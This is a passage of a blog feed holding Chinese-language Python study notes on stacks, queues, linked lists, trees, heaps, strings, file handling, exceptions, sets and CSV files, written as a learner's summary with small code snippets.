        <content type="html"><![CDATA[<h2 id="数据结构编程心得"><a href="#数据结构编程心得" class="headerlink" title="数据结构编程心得"></a>数据结构编程心得</h2><ol><li>确定好所有属性</li><li>先用注释的方式将整个算法思路写下来，再一步步慢慢实现</li><li>每个成员函数的编写都根据属性来进行考虑、修改</li><li>确定成员函数需不需要return(鉴别方法和函数)</li></ol><h2 id="数组栈"><a href="#数组栈" class="headerlink" title="数组栈"></a>数组栈</h2><p>先进后出规则(浏览器历史记录等)</p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><ol><li>容器：列表</li></ol><h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ol><li>创建一个空列表作为栈的容器(属性)</li><li>获取栈的大小</li></ol><ul><li><strong>len</strong> 方法</li></ul><ol start="3"><li>判断栈是否为空</li><li>压栈</li></ol><ul><li>需要传值</li><li>push()函数需自己实现</li><li>利用列表的append()方法</li></ul><ol start="5"><li>弹栈</li></ol><ul><li>判断栈是否为空</li><li>pop()函数为内置函数</li></ul><ol start="6"><li>返回栈顶元素</li></ol><ul><li>判断栈是否为空</li><li>返回反向索引的第一个值</li></ul><h3 id="栈应用"><a href="#栈应用" class="headerlink" title="栈应用"></a>栈应用</h3><ol><li>数字逆序输出</li><li>符号匹配问题</li></ol><h2 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h2><p>先进先出，循环队列</p><h3 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h3><ol><li>容器：列表</li><li>队列的长度</li><li>队列首部元素的索引位置</li></ol><h3 id="实现思路-1"><a href="#实现思路-1" class="headerlink" title="实现思路"></a>实现思路</h3><ol><li>初始化队列</li></ol><ul><li>容器为列表，列表由10个None cap组成<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>None,None,None,None,None,None,None,None,None,None,None<span class="token punctuation">]</span></code></pre></li><li>队列长度默认为0</li><li>队列首部元素的索引位置默认为0</li></ul><ol start="2"><li>获取队列长度</li></ol><ul><li>使用<strong>len</strong> 方法</li></ul><ol start="3"><li>判断队列是否为空</li></ol><ul><li>看队列长度是否为0</li></ul><ol start="4"><li>为队列重置容器大小</li></ol><ul><li>需要传入增加大小的参数cap</li><li>用一个列表保存旧的队列的值</li><li>重新设置容器的大小：<pre class=" language-bash"><code class="language-bash">新的容器大小 <span class="token operator">=</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>* cap</code></pre></li><li>将保存旧队列的列表的值重新赋值到新队列中：<pre class=" language-bash"><code class="language-bash">a. 保存旧队列首部元素索引b. 将旧列表的元素按照原本位置放置到新的容器中，映射关系公式为：新队列的第一个元素对应旧队列的首部元素新队列其他元素对于旧队列的其他元素索引位置关系公式 ：          索引位置 <span class="token operator">=</span> <span class="token punctuation">(</span>旧队列首部元素的索引位置+1<span class="token punctuation">)</span> % 旧容器的长度</code></pre></li><li>将队列首部元素的索引置为0</li></ul><ol start="5"><li>删除首部元素(出队)</li></ol><ul><li>判断队列是否为空</li><li>将首部元素的值放入一个变量中</li><li>将原首部元素的索引位置的值设置为None</li><li>使用插入队列的公式将队列的首部元素的索引位置重新设置：<pre class=" language-bash"><code class="language-bash">新的首部元素位置索引 <span class="token operator">=</span> <span class="token punctuation">(</span>旧的首部元素位置索引+1<span class="token punctuation">)</span> % 容器的总长度</code></pre></li><li>队列长度减1</li></ul><ol start="6"><li>在队列尾部加入元素(入队)</li></ol><ul><li>需要传值</li><li>判断容器长度是否足够，若不够则调用重置容器大小的方法增加队列容器大小</li><li>在队列末尾加入元素的索引位置公式为：<pre class=" language-bash"><code class="language-bash">新元素索引位置 <span class="token operator">=</span> <span class="token punctuation">(</span>队列首部元素的索引+队列的长度<span class="token punctuation">)</span> % 容器的总长度</code></pre></li><li>为新的索引位置赋值</li><li>队列的长度+1</li></ul><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h3><h4 id="属性-2"><a href="#属性-2" class="headerlink" title="属性"></a>属性</h4><h5 id="结点类"><a href="#结点类" class="headerlink" title="结点类"></a>结点类</h5><ol><li>结点的值</li><li>下一个结点的引用</li></ol><h5 id="链表类"><a href="#链表类" class="headerlink" title="链表类"></a>链表类</h5><ol><li>链表首部结点</li></ol><h4 id="实现思路-2"><a href="#实现思路-2" class="headerlink" title="实现思路"></a>实现思路</h4><ol><li>初始化</li></ol><ul><li>首部结点(初始化为None)</li></ul><ol start="2"><li>链表长度</li></ol><ul><li>从链表首部结点开始遍历链表，直至结点的下一个结点引用为0</li><li>返回链表长度</li></ul><ol start="3"><li>判断链表是否为空</li></ol><ul><li>链表长度是否为0</li></ul><ol start="4"><li>首部加结点</li></ol><ul><li>保留旧首部结点</li><li>将新首部结点的下一个结点引用修改为旧首部结点</li><li>修改链表的首部结点引用</li></ul><ol start="5"><li>尾部加结点</li></ol><ul><li>遍历到链表的尾部结点</li><li>修改尾部结点的下一个结点引用</li></ul><ol start="6"><li>在指定位置加入结点</li></ol><ul><li>判断链表是否为空</li><li>遍历到指定位置(使用循环：指定位置-1)</li><li>保存指定位置下一个结点的引用</li><li>修改指定位置下一个结点的引用指向新增结点</li><li>修改新增结点的下一个结点引用指向之前保存的结点引用</li></ul><ol start="7"><li>在指定位置删除结点</li></ol><ul><li>判断链表是否为空</li><li>遍历到指定位置前一个位置 </li><li>修改三个结点的引用</li></ul><ol start="8"><li>查找指定位置的结点</li></ol><ul><li>判断链表是否为空</li><li>遍历到指定位置，返回结点的值</li></ul><ol start="9"><li>打印链表</li></ol><ul><li>遍历每一个结点，并将结点的值一次追加放入一个空列表中</li><li>打印输出列表</li></ul><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><p>每个结点都包含了指向其前驱结点的引用和指向后驱结点的引用。在列表的起始位置添加头结点，在列表的结尾位置添加尾结点。这些结点并不存储主序列的元素</p><h4 id="属性-3"><a href="#属性-3" class="headerlink" title="属性"></a>属性</h4><h5 id="结点类-1"><a href="#结点类-1" class="headerlink" title="结点类"></a>结点类</h5><ol><li>结点值</li><li>结点前缀引用(初始值需要传入)</li><li>结点后缀引用(初始值需要传入)</li></ol><h5 id="双向链表类"><a href="#双向链表类" class="headerlink" title="双向链表类"></a>双向链表类</h5><ol><li>尾部哨兵</li><li>头部哨兵</li><li>头部哨兵的后缀引用</li><li>尾部哨兵的前缀引用</li><li>链表长度</li></ol><h4 id="实现思路-3"><a href="#实现思路-3" class="headerlink" title="实现思路"></a>实现思路</h4><ol><li>初始化结点类</li><li>初始化双向链表类</li><li>链表长度</li><li>链表是否为空</li><li>向链表追加结点(每次都在链表的尾部哨兵前加入)</li></ol><ul><li>保存尾部哨兵的前缀结点</li><li>修改尾部哨兵的前缀引用为新结点</li><li>修改尾部哨兵的旧的前缀结点的后缀引用为新结点</li><li>修改新结点的前后缀引用</li><li>链表长度加1</li></ul><ol start="6"><li>在指定结点间加入新的结点(传入值，前后缀结点)</li></ol><ul><li>创建新结点，结点前后缀引用为传入的前后缀结点</li><li>修改前缀结点的后缀引用</li><li>修改后缀结点的前缀引用</li><li>链表长度+1</li><li>返回新加入的结点</li></ul><ol start="7"><li>删除结点(传入结点)</li></ol><ul><li>判断链表是否为空</li><li>保存要删除的结点</li><li>修改删除结点的前后缀结点的引用</li><li>链表长度-1</li></ul><ol start="8"><li>打印输出</li></ol><ul><li>判断是否为空</li><li>初始化空列表</li><li>遍历链表向空列表中追加元素</li><li>打印列表</li></ul><blockquote><p>注：在双向链表中，删除、加入结点对每一个涉及到的结点的前后缀引用都要进行修改</p></blockquote><h3 id="循环链表实现队列"><a href="#循环链表实现队列" class="headerlink" title="循环链表实现队列"></a>循环链表实现队列</h3><p>队列有一个头部和尾部，但是尾部的next指针指向头部</p><h4 id="属性-4"><a href="#属性-4" class="headerlink" title="属性"></a>属性</h4><h5 id="结点类-2"><a href="#结点类-2" class="headerlink" title="结点类"></a>结点类</h5><ol><li>结点的值</li><li>下一个结点的引用</li></ol><h5 id="循环链表实现"><a href="#循环链表实现" class="headerlink" title="循环链表实现"></a>循环链表实现</h5><ol><li>队列的尾部引用</li><li>队列的长度</li></ol><h4 id="实现思路-4"><a href="#实现思路-4" class="headerlink" title="实现思路"></a>实现思路</h4><ol><li>初始化结点类</li><li>初始化循环队列类</li></ol><ul><li>需传入一个结点作为尾部引用</li><li>将尾部的next指针(头部)也指向node</li><li>队列长度</li></ul><ol start="3"><li>队列长度</li><li>队列是否为空</li><li>队列尾部加入结点</li></ol><ul><li>保存头部结点</li><li>将加入结点的引用设置为头部结点</li><li>重置队列的尾部引用</li><li>长度+1</li></ul><ol start="6"><li>队列首部删除元素</li></ol><ul><li>保存首部元素</li><li>修改尾部引用指向首部元素的下一个结点引用</li><li>长度-1</li><li>返回删除的元素</li></ul><ol start="7"><li>打印</li></ol><h2 id="树"><a href="#树" class="headerlink" title="树"></a>树</h2><h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><p>每个父节点最多有两个子节点，深度搜素使用递归，广度搜索使用栈</p><h4 id="属性-5"><a href="#属性-5" class="headerlink" title="属性"></a>属性</h4><h5 id="节点类"><a href="#节点类" class="headerlink" title="节点类"></a>节点类</h5><ol><li>节点值</li><li>左子树</li><li>右子树</li></ol><h5 id="二叉树类"><a href="#二叉树类" class="headerlink" title="二叉树类"></a>二叉树类</h5><ol><li>根节点</li></ol><h4 id="实现思路-5"><a href="#实现思路-5" class="headerlink" title="实现思路"></a>实现思路</h4><ol><li>初始化节点类</li><li>初始化二叉树类</li><li>加入节点(传入节点)</li></ol><ul><li>判断根节点是否为空，为空则插入</li><li>根节点追加到空列表中</li><li>空列表不为空则循环</li><li>利用栈，分别判断左右子树(先左后右)是否为空，为空则插入节点，否则将该节点压栈</li></ul><ol start="4"><li>前序遍历(传入节点)</li></ol><ul><li>按照遍历顺序分别判断左右节点是否为空，不为空则递归</li><li>在该节点被遍历的位置打印输出</li></ul><ol start="5"><li>后序遍历</li><li>中序遍历</li><li>层序遍历</li></ol><ul><li>判断根节点是否为空</li><li>根节点追加到空列表中</li><li>空列表不为空则循环</li><li>打印输出列表的首部元素</li><li>利用栈，分别判断左右子树是否为空，不为空则将该节点压栈</li></ul><ol start="8"><li>树高</li></ol><ul><li>判断根节点是否为空，为空返回0</li><li>判断左右子树的四种情况(elif)，左右子树均为空时打印输出，其他情况哪个节点不为空该节点就调用递归并加1</li><li>左右节点都不为空的情况下取递归次数最多的那一边</li></ul><ol start="9"><li>叶子节点</li></ol><ul><li>判断根节点是否为空</li><li>判断左右子树的四种情况(elif)，左右子树均为空时打印输出，其他情况哪个节点不为空该节点就调用递归</li></ul><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>二叉搜索树是具有有以下性质的二叉树：</p><ul><li>若左子树不为空，则左子树上所有节点的值均小于或等于它的根节点的值。</li><li>若右子树不为空，则右子树上所有节点的值均大于或等于它的根节点的值。</li><li>左、右子树也分别为二叉搜索树。</li></ul><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><ul><li>大顶堆：所有的父节点的值都比孩子节点大，叶子节点值最小。root 根节点是第一个节点值最大</li><li>小顶堆：和大顶堆相反，所有父节点值，都小于子节点值，root 根节点是 第一个节点值最小</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(8)</title>
      <link href="/2019/10/07/python8/"/>
      <url>/2019/10/07/python8/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>###　什么是文本<br>文本是一串字符，二进制数据一串字节</p><h3 id="基本的文本操作"><a href="#基本的文本操作" class="headerlink" title="基本的文本操作"></a>基本的文本操作</h3><p>总的来说，有三种基本的文本操作：</p><ul><li>解析数据并将数据放入程序内部的结构中</li><li>将数据以某种形式转换为另一种相似的形式，数据本身发生了改变</li><li>生成全新的数据</li></ul><h3 id="字符串基础"><a href="#字符串基础" class="headerlink" title="字符串基础"></a>字符串基础</h3><p>Python提供的用于文本处理的最主要的工具就是字符串–不可改变的字符序列。实际上存在两种字符串：</p><ul><li>普通字符串：包含了8位ASCII字符，有256个不同的字符。</li><li>Unicode字符串：包含了Unicode字符，Unicode字符串的处理方式和普通字符串类似，只不过它们每个字符占用2(或者4)个字节，所以它们拥有成千上万甚至上亿个字符。</li></ul><p>在Python中，用下列方式可以表示一个文本字符串：</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'This is a string'</span><span class="token string">"This is another string"</span></code></pre><p>字符串的值被双引号或单引号圈起，这两种表示法在程序中完全一样，都允许你在字符串内部引用引号：</p><pre class=" language-bash"><code class="language-bash"><span class="token string">'Isn\'t that grand'</span><span class="token string">"Isn't that grand"</span></code></pre><p>为了让文本字符串扩展到多行，可以在一行末尾使用反斜杠符号，意味着下一行仍是上面字符串的延续：</p><pre class=" language-bash"><code class="language-bash">big <span class="token operator">=</span> <span class="token string">"This is a long\string that spans two lines"</span></code></pre><p>如果想让字符串的输出分为两行，可以在字符串中嵌入换行符：</p><pre class=" language-bash"><code class="language-bash">big <span class="token operator">=</span> <span class="token string">"This is a long\n\string that spans two lines"</span></code></pre><p>还有一种方式是用一对连续的三引用符将字符串圈起来：</p><pre class=" language-bash"><code class="language-bash">bigger <span class="token operator">=</span> <span class="token string">""</span><span class="token string">"This is a string thatspans two lines"</span><span class="token string">""</span></code></pre><p>使用上述的三引用符无需加入续行符和换行符，文本将按照原貌被储存</p><p>在Python的字符串对象中，也可以在字符串前面加一个r或R，表示该字符串是一个真正的”原”字符串，需要它的原貌:</p><pre class=" language-bash"><code class="language-bash">big <span class="token operator">=</span> r<span class="token string">"This is a long\n\string that spans two lines"</span></code></pre><p>使用原字符串，反斜线转义和换行符完全被忽略。还可以在字符串前面加一个U或u使之成为一个Unicode字符串：</p><pre class=" language-bash"><code class="language-bash">hello <span class="token operator">=</span> u<span class="token string">"hello\u0020World"</span></code></pre><p>字符串是无法改变的，意味着无论你对它进行什么操作，你总是创建了一个新的字符串对象，而不是改变了原有字符串。字符串是字符的序列，所以可以通过索引的方法访问单个字符：</p><pre class=" language-bash"><code class="language-bash">myStr <span class="token operator">=</span> <span class="token string">"my string"</span>myStr<span class="token punctuation">[</span>0<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#m</span>myStr<span class="token punctuation">[</span>-2<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#n</span></code></pre><p>也可以用切片的方式访问字符串的一部分：</p><pre class=" language-bash"><code class="language-bash">myStr<span class="token punctuation">[</span>1:4<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#y s</span>myStr<span class="token punctuation">[</span>3:<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#string</span>myStr<span class="token punctuation">[</span>-3:<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#ing</span></code></pre><p>切片还能增加第三个参数，作为切片的步长  </p><pre class=" language-bash"><code class="language-bash">myStr<span class="token punctuation">[</span>:3:-1<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#gnirt</span>myStr<span class="token punctuation">[</span>1::2<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#ysrn</span></code></pre><p>可以通过循环遍历字符串:</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">for</span> c <span class="token keyword">in</span> myStr</code></pre><blockquote><p>注：不能试图改变字符串序列，字符串不能改变</p></blockquote><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>可以使用下列语句逐行对文件对象进行处理:</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">for</span> line <span class="token keyword">in</span> fileName:    process<span class="token punctuation">(</span>line<span class="token punctuation">)</span></code></pre><p>对于二进制数据，行是一个没有意义的函数，所以可以使用read()函数读取二进制文件。当read()不传入参数时，read会读取并返回文件中所有的剩余字节</p><h4 id="一次性读取文件"><a href="#一次性读取文件" class="headerlink" title="一次性读取文件"></a>一次性读取文件</h4><p>一次性读取文件放入一个大字符串中：</p><pre class=" language-bash"><code class="language-bash">all_the_text <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'fileName.txt'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#文本文件所有文本</span>all_the_data <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'fileName'</span>,<span class="token string">'rb'</span><span class="token punctuation">)</span>.read<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#二进制文件所有数据</span></code></pre><p>为了安全起见，最好还是给打开的文件对象指定一个名字，这样可以保证在完成操作后迅速关闭文件，防止一些无用的文件对象占用内存：</p><pre class=" language-bash"><code class="language-bash">file_object <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'fileName.txt'</span><span class="token punctuation">)</span>try:    all_the_text <span class="token operator">=</span> file_object.readfinally</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(5)</title>
      <link href="/2019/10/07/python5/"/>
      <url>/2019/10/07/python5/</url>
      
        <content type="html"><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>异常是一种运行时的错误，通常是由于程序的运行状态超出了程序员所掌控的范围。</p><h3 id="常见的异常"><a href="#常见的异常" class="headerlink" title="常见的异常"></a>常见的异常</h3><p><font color="#fb8c00">AttributeError</font> 向一个对象发起了不可用的功能请求</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>3,2,1<span class="token punctuation">)</span>.sort    <span class="token comment" spellcheck="true">#元组不能进行更改，无sort方法</span></code></pre><p><font color="#fb8c00">FileNotFoundError</font> 请求的文件不存在或不再指定位置<br><font color="#fb8c00">importError</font>  import语句无法找到请求的模块<br><font color="#fb8c00">IndexError</font>  索引越界<br><font color="#fb8c00">KeyError</font>  字典中没有该键<br><font color="#fb8c00">NameError</font>  变量的值无法找到<br><font color="#fb8c00">TypeError</font>  一个函数或一个操作符收到的参数类型错误</p><pre class=" language-bash"><code class="language-bash">x <span class="token operator">=</span> len<span class="token punctuation">(</span>23<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#len()是对于字符串的操作</span></code></pre><p><font color="#fb8c00">ValueError</font> 函数或操作符收到的参数类型正确，但是值不正确</p><pre class=" language-bash"><code class="language-bash">x <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#error</span></code></pre><p><font color="#fb8c00">ZeroDivisionError</font>  在除法或取余操作中第二个操作数为0</p><pre class=" language-bash"><code class="language-bash">num <span class="token operator">=</span> 1/0  <span class="token comment" spellcheck="true">#error</span></code></pre><h3 id="try语句"><a href="#try语句" class="headerlink" title="try语句"></a>try语句</h3><p>python会首先去执行try语句块，如果异常发生，则跳到except子句</p><pre class=" language-bash"><code class="language-bash">try: <span class="token comment" spellcheck="true">#如果用户在此处不进行输入则会发生异常，因为输入的空字符串无法转换为一个整数</span>    num <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"Enter number of dependents:"</span><span class="token punctuation">))</span> except ValueError:    print<span class="token punctuation">(</span><span class="token string">"\nYou did not respond with an integer value.\n"</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"We will assume your answer is 0\n"</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> 0<span class="token function">sum</span> <span class="token operator">=</span> 1000*num   print<span class="token punctuation">(</span><span class="token string">"sum:"</span>,sum<span class="token punctuation">)</span></code></pre><blockquote><p>注：不论是否发生异常，最后两条语句都会被执行。</p></blockquote><h4 id="except类型"><a href="#except类型" class="headerlink" title="except类型"></a>except类型</h4><p>一个try语句可以包含几个except子句,下面是三种except子句类型</p><ul><li>except:发生任何异常都会执行这个语句块的内容。</li><li>except ExceptionType:只有发生了特定类型的异常才执行这个语句块的内容。</li><li>except ExceptionType as exp: 只有发生了特定类型的异常才执行这个语句块的内容，问题的附加信息赋值给了exp变量。</li><li>一个单独的except子句可以涉及多种错误类型，如果是这样的话，错误名称需要在元组中列出来，except (ValueError,NameError) as exc:。</li></ul><h2 id="生成随机数"><a href="#生成随机数" class="headerlink" title="生成随机数"></a>生成随机数</h2><h3 id="random模块中的函数"><a href="#random模块中的函数" class="headerlink" title="random模块中的函数"></a>random模块中的函数</h3><p>如果L是一个列表<br><font color="#fb8c00">random.choice(L)</font> 从L中随机选择一个元素<br><font color="#fb8c00">random.sample(L,n)</font> 将会创建一个列表，其中包含从L中随机选取的n个元素<br><font color="#fb8c00">random.shuffle(L)</font>  将会随机重排L中的元素<br><font color="#fb8c00">random.randint(m,n)</font> 将会从m~n中随机选择一个整数 </p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(4)</title>
      <link href="/2019/10/07/python4/"/>
      <url>/2019/10/07/python4/</url>
      
        <content type="html"><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="读取文本文件"><a href="#读取文本文件" class="headerlink" title="读取文本文件"></a>读取文本文件</h3><pre class=" language-bash"><code class="language-bash">infile <span class="token operator">=</span> open<span class="token punctuation">(</span>fileName,<span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#为了读取而打开文件</span><span class="token keyword">for</span> line <span class="token keyword">in</span> infile:       <span class="token comment" spellcheck="true">#连续</span>    listVar <span class="token operator">=</span> <span class="token punctuation">[</span>line.rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line infile<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#生成字符串列表，其中列表的每一项是文件中的一行减去一个换行符</span>infile.close<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#关闭文件</span></code></pre><p>一个为了读取而被打开的文件也能使用read和readline方法访问</p><pre class=" language-bash"><code class="language-bash">strVar <span class="token operator">=</span> infile.read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将文件的全部内容置于一个字符串中</span>strVar <span class="token operator">=</span> infile.readline<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 当前行被赋值给strVar,指针前进到该行结尾。所有行读取后，readline返回空字符串</span></code></pre><h3 id="创建文本文件"><a href="#创建文本文件" class="headerlink" title="创建文本文件"></a>创建文本文件</h3><p>使用指定名字创建了一个文本文件，这个文件被指定为为了写入而打开</p><pre class=" language-bash"><code class="language-bash">outfile <span class="token operator">=</span> open<span class="token punctuation">(</span>fileName,<span class="token string">'w'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#outfile用来向文件中写入行</span>outfile.writelines<span class="token punctuation">(</span>list1<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#将列表list1中的每一个元素作为一行写入文件中</span>outfile.write<span class="token punctuation">(</span>strVar<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#将字符串strVar的值追加到文件中</span></code></pre><blockquote><p>注：只有字符串才能被写入到文本文件中</p></blockquote><h4 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h4><p>由于内存的访问速度远远快于磁盘的访问速度，python分配了一块叫作缓冲区的内存空间，用来临时保存将要写进磁盘的数据。一旦缓冲区满，或是文件被关闭，缓冲区的内容就会被写入磁盘，所以，在执行write/writelines语句后，必须关闭文件，以确保所有数据在物理层面上传输到了磁盘中。</p><h3 id="向已有文本文件中添加行"><a href="#向已有文本文件中添加行" class="headerlink" title="向已有文本文件中添加行"></a>向已有文本文件中添加行</h3><pre class=" language-bash"><code class="language-bash">outfile <span class="token operator">=</span> open<span class="token punctuation">(</span>fileName,<span class="token string">'a'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#为了添加而打开</span>outfile.write<span class="token punctuation">(</span>strVar<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#用write方法添加行</span>outfile.writelines<span class="token punctuation">(</span>list1<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#用writelines方法添加行</span></code></pre><blockquote><p>注:如果为了追加而打开的文件不存在，那么open语句会使用指定的名字创建一个新的文件</p></blockquote><h3 id="修改文本文件中的元素"><a href="#修改文本文件中的元素" class="headerlink" title="修改文本文件中的元素"></a>修改文本文件中的元素</h3><p>我们不能直接对文件进行修改、插入、删除文本文件中的行，所以我们首先需要创建一个文件，从原来的文件中读入、记录并改动每一个元素，然后写入到新的文件里，随后删除旧文件，并将新的文件重命名为原来的文件名。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> os <span class="token comment" spellcheck="true">#引入标准库模块</span></code></pre><p><font color="#fb8c00">os.remove(fileName)</font> 删除指定文件<br><font color="#fb8c00">os.rename(oldFileName,newFileName)</font> 修改文件名字/路径</p><blockquote><p>注：remove和rename函数不可以使用在已经打开的文件上，rename函数的第二个参数也不能是一个已经存在的文件名。</p></blockquote><p><font color="#fb8c00">os.path.isfile(fileName)</font> 在指定文件存在时会返回true，否则返回false</p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><ul><li>列表是以元素的顺序存储容器，并且允许元素重复</li><li>集合是元素的无序存储容器，不允许重复的元素</li><li>集合使用花括号来包围元素</li><li>集合可以容纳数值、字符串、布尔值和元组</li><li>集合不可以容纳列表或其他集合<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"hello"</span>,<span class="token string">"world"</span><span class="token punctuation">}</span>/<span class="token punctuation">{</span>3,5,7<span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">#集合</span></code></pre></li></ul><h3 id="集合和列表-元组-的区别"><a href="#集合和列表-元组-的区别" class="headerlink" title="集合和列表(元组)的区别"></a>集合和列表(元组)的区别</h3><ul><li>集合中任何元素不可以出现两次</li><li>集合中的元素是无序的，所以集合不能使用下标索引，切片以及列表中类似sort/reserve的方法对于集合都是无意义的</li></ul><h3 id="集合操作"><a href="#集合操作" class="headerlink" title="集合操作"></a>集合操作</h3><pre class=" language-bash"><code class="language-bash">words <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"span"</span>,<span class="token string">"ni"</span><span class="token punctuation">}</span></code></pre><p><font color="#fb8c00">add</font> 在集合中增加元素</p><pre class=" language-bash"><code class="language-bash">words.add<span class="token punctuation">(</span><span class="token string">"eggs"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#words={"span","ni","eggs"}</span></code></pre><p><font color="#fb8c00">discard</font> 移除指定元素</p><pre class=" language-bash"><code class="language-bash">words.discard<span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># words={"ni"}</span></code></pre><p><font color="#fb8c00">clear</font>  清空集合</p><pre class=" language-bash"><code class="language-bash">words.clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># set() set()表示空集</span></code></pre><p><font color="#fb8c00">set</font> 将一个元组/列表转换为集合</p><pre class=" language-bash"><code class="language-bash">set<span class="token punctuation">(</span><span class="token punctuation">[</span>3,3,7<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#{3,7}</span><span class="token keyword">set</span><span class="token variable"><span class="token punctuation">((</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">))</span></span>    <span class="token comment" spellcheck="true">#{3,7}</span></code></pre><blockquote><p>注：当set函数应用到列表或元组上时，原本重复的元素在集合中只会出现一次</p></blockquote><h4 id="集合推导"><a href="#集合推导" class="headerlink" title="集合推导"></a>集合推导</h4><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">{</span>x * x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>-3,3<span class="token punctuation">)</span> <span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">#产生集合{0,1,4,9}</span></code></pre><h4 id="集合论方法"><a href="#集合论方法" class="headerlink" title="集合论方法"></a>集合论方法</h4><pre class=" language-bash"><code class="language-bash">set1.union<span class="token punctuation">(</span>set2<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#set1和set2的并集</span>set1.intersection<span class="token punctuation">(</span>set2<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#set1和set2的交集</span>set1.difference<span class="token punctuation">(</span>set2<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#set1和set2的补集</span></code></pre><h2 id="CSV文件"><a href="#CSV文件" class="headerlink" title="CSV文件"></a>CSV文件</h2><p>CSV文件(CSV-formatted file)：每一行包含了若干条数据项，每一项数据之间用逗号分隔开</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># CSV文件</span><span class="token comment" spellcheck="true"># 